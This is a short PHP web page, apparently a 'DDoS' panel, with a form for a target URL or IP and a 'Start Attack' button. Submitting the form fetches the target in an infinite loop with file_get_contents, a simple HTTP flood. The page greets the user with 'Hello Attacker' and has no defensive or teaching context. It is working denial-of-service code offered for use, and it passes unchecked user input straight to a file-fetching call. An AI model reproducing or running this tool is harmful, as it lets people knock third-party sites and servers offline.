<html>
<head>
<title>DDoS Security - Down</title>
<style>
body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; }
h1,h3 { color:white; font-family:Verdana; font-size:11px; }
input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }
textarea { font-family:Courier; }
a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; }
a:hover { color:rgb(0, 250, 0); }
td { font-size:12px; vertical-align:middle; }
th { font-size:13px; vertical-align:middle; }
table { empty-cells:show; }
.inf { color:#7F7F7F; }
</style>
</head>
<body>
<?php
$http = $_POST['http'];
$submit = $_POST['submit'];
$select = $_POST['select'];

if(!$submit) {
    echo '
    <center>
    <form action="index.php" method="post">
    <input name="http" value="Add URL Or Ip"></input><br>
    <br></br>
    <input value="Request /ex:1000" name="select"></input><br>
    <br></br>
    <input value="Start Attack" type="submit" name="submit"></input>
    </form>
    </center>
    ';
}
echo "<center><hr>
<h3>Results:</h3></center>";
if($submit) {
    ini_set('user_agent', 'DDOS Attack to: $http');
    $ihttp = file_get_contents("$http");
    if($ihttp == true)
    {
        $file .= "Request : True";
        echo "<center>Hello Attacker<br></center>";
        echo "<center>Attack Now ...<br></center>";
        while(true)
        {
            print("<center>Attacking...<br></center>");
            $ihttp = file_get_contents("$http");
        }
        return $ihttp;
    }
    echo "$ihttp";
}
?>
</body>
</html>
